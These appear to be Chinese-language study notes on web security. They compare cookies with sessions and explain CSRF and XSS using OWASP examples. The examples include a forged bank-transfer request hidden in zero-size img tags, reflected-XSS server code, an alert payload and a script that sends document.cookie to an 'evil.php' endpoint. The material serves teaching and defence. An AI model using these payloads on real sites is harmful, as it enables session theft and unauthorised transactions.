## cookie vs session
作用：保存用户浏览页面存下的数据

+ cookie在客户端保存， session用cookie作为各样的key，在服务端保存
+ session在浏览器关闭时关闭，cookie依赖生成时的设定值。
+ 优先使用sesssion保存。
  + 1. 实际数据对客户端隐藏
  + 2. 可防止cookie被串改
  + 3. 可直接控制有效期 

+ transient cookie也叫session cookie. 
  + 浏览器关闭即消失
  + 数据存储在浏览器的临时存储区，而不是硬盘
  + 创建cookie时不设定`Set-Cookie`选项的日期
  

## CSRF vs XSS
[wiki](https://en.wikipedia.org/wiki/Cross-site_request_forgery)

+ 前者利用站点对浏览器的信任，后者利用浏览器对站点的信任。
+ csrf是欺骗已授权的用户发送自己不确认的指令。<br>比如：某页面允许点击链接来删除当前用户的数据，根据session cookie，其数据被移除。要实施攻击，只需要用户装入一个url(<em>或者img自动装入，img与xmlhttprequest不同，img可以从任意地方下载</em>)就可以。。因为请求由浏览器发出，也就带了session cookie,就不需要用户的identity了。<br>
 
### [csrf例子](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
  + Alice转100元给BOB<br>
    `GET http://bank.com/transfer.do?acct=BOB&amount=100 HTTP/1.1`
  + Mario修改指令.<br>
    `GET http://bank.com/transfer.do?acct=MARIA&amount=100000 HTTP/1.1` <br>
    她可以在任意页面装入这个链接
     `<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>`
    '<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" border="0">'

### [xss例子](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
  + 例子1，服务端返回的eid不是数字而是js脚本 <pre>
  &lt;% String eid = request.getParameter("eid"); %> 
	...
	Employee ID: &lt;%= eid %>
  </pre>
  + 例子2 从已授权用户盗取cookie.只要在一个post请求中放入代码
  <pre>
  &lt;SCRIPT type="text/javascript">`
   var adr = '../evil.php?cakemonster=' + escape(document.cookie);`
  &lt;/SCRIPT>`</pre>

  + 在地址栏放入代码。<br>
  假定服务器有如下代码：
  <pre>&lt;? php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?></pre>
  正常返回:`Not found: /file_which_not_exist`<br>
  只要在浏览器输入`http://testsite.test/<script>alert("TEST");</script>`<br>
  服务器就回返回`Not found: / (but with JavaScript code <script>alert("TEST");</script>)`